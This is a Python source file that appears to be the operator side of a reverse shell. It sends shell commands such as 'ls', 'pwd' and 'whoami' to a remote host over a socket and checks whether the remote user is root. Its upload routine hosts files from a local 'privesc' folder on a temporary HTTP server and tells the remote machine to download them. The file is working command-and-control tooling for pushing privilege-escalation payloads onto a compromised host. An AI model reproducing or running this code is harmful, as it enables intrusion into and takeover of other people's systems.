#!/usr/bin/env python3
import signal
import os
import random
import time
import socket
import subprocess
import readline
import sys
import socketserver,http.server
import netifaces as ni
from random import randint


class Rhost:

    def getDir(conn):
        bufferSize = 2**12
        getDir = "ls"
        conn.send(getDir.encode())
        listDir = conn.recv(bufferSize).decode()
        list = listDir.split('\n')

        def completer(text, state):
            options = [cmd for cmd in list if cmd.startswith(text)]
            if state < len(options):
                return options[state]
            else:
                return None

        readline.parse_and_bind("tab: complete")
        readline.set_completer(completer)

    def init(conn):
        bufferSize = 2**12
        conn.send(b'pwd')
        home = conn.recv(bufferSize).decode()
        conn.send(b'whoami')
        user = conn.recv(bufferSize).decode()
        if user != 'root':
            tag = "$"
        else:
            tag = "#"
        return home,user,tag
        
    def upload(conn,iface,src,dest,path):
        port = randint(2000,30000)
        if iface == "local":
            try:
                ip = ni.ifaddresses("wlan0")[ni.AF_INET][0]['addr']
            except ValueError:
                ip = ni.ifaddresses("wlp2s0")[ni.AF_INET][0]['addr']
        elif iface == "vpn":
            try:
                ip = ni.ifaddresses("tun0")[ni.AF_INET][0]['addr']
            except ValueError:
                print("Not valid interface ! ")
                sys.exit()

        if os.path.isfile("%s/privesc/"%(path)+src):
            os.chdir("%s/privesc/"%(path))
            msg = "upload %s %s %s %s"%(dest,ip,src,port)
            conn.send(msg.encode())
            handler = http.server.SimpleHTTPRequestHandler
            with socketserver.TCPServer(("", port), handler) as httpd:
                print("UPLOAD STARTED !")
                httpd.serve_forever()

        else:
            print('This file doesn\'t exist :%s'%(src))
